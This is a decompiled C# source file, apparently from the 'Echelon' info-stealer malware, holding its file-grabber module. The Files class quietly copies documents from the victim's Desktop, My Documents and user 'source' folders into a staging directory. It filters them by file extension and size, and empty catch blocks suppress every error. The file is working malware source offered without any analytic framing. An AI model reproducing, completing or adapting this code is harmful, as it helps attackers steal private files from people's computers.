using System;
using System.Collections.Generic;
using System.IO;
using Echelon.Global;

namespace Echelon.Stealer.FileGrabber
{
	// Token: 0x0200001B RID: 27
	public class Files
	{
		// Token: 0x06000048 RID: 72 RVA: 0x000048BC File Offset: 0x00002ABC
		public static void GetFiles(string Echelon_Dir)
		{
			if (Program.enableGrab)
			{
				try
				{
					string text = Echelon_Dir + "\\Files";
					Directory.CreateDirectory(text);
					if (!Directory.Exists(text))
					{
						Files.GetFiles(text);
					}
					else
					{
						Files.CopyDirectory(Help.DesktopPath, text, "*.*", (long)Program.sizefile);
						Files.CopyDirectory(Help.MyDocuments, text, "*.*", (long)Program.sizefile);
						Files.CopyDirectory(Help.UserProfile + "\\source", text, "*.*", (long)Program.sizefile);
					}
				}
				catch
				{
				}
			}
		}

		// Token: 0x06000049 RID: 73 RVA: 0x00004964 File Offset: 0x00002B64
		private static long GetDirSize(string path, long size = 0L)
		{
			try
			{
				foreach (string fileName in Directory.EnumerateFiles(path))
				{
					try
					{
						size += new FileInfo(fileName).Length;
					}
					catch
					{
					}
				}
				foreach (string path2 in Directory.EnumerateDirectories(path))
				{
					try
					{
						size += Files.GetDirSize(path2, 0L);
					}
					catch
					{
					}
				}
			}
			catch
			{
			}
			return size;
		}

		// Token: 0x0600004A RID: 74 RVA: 0x00004A54 File Offset: 0x00002C54
		public static void CopyDirectory(string source, string target, string pattern, long maxSize)
		{
			Stack<GetFiles.Folders> stack = new Stack<GetFiles.Folders>();
			stack.Push(new GetFiles.Folders(source, target));
			long num = Files.GetDirSize(target, 0L);
			while (stack.Count > 0)
			{
				GetFiles.Folders folders = stack.Pop();
				try
				{
					Directory.CreateDirectory(folders.Target);
					foreach (string text in Directory.EnumerateFiles(folders.Source, pattern))
					{
						try
						{
							if (Array.IndexOf<string>(Program.expansion, Path.GetExtension(text).ToLower()) >= 0)
							{
								string text2 = Path.Combine(folders.Target, Path.GetFileName(text));
								if (new FileInfo(text).Length / 1024L < 5000L)
								{
									File.Copy(text, text2);
									num += new FileInfo(text2).Length;
									if (num > maxSize)
									{
										return;
									}
									Files.count++;
								}
							}
						}
						catch
						{
						}
					}
				}
				catch (UnauthorizedAccessException)
				{
					continue;
				}
				catch (PathTooLongException)
				{
					continue;
				}
				try
				{
					foreach (string text3 in Directory.EnumerateDirectories(folders.Source))
					{
						try
						{
							if (!text3.Contains(Path.Combine(Help.DesktopPath, Environment.UserName)))
							{
								stack.Push(new GetFiles.Folders(text3, Path.Combine(folders.Target, Path.GetFileName(text3))));
							}
						}
						catch
						{
						}
					}
				}
				catch (UnauthorizedAccessException)
				{
				}
				catch (DirectoryNotFoundException)
				{
				}
				catch (PathTooLongException)
				{
				}
			}
			stack.Clear();
		}

		// Token: 0x04000039 RID: 57
		public static int count;
	}
}
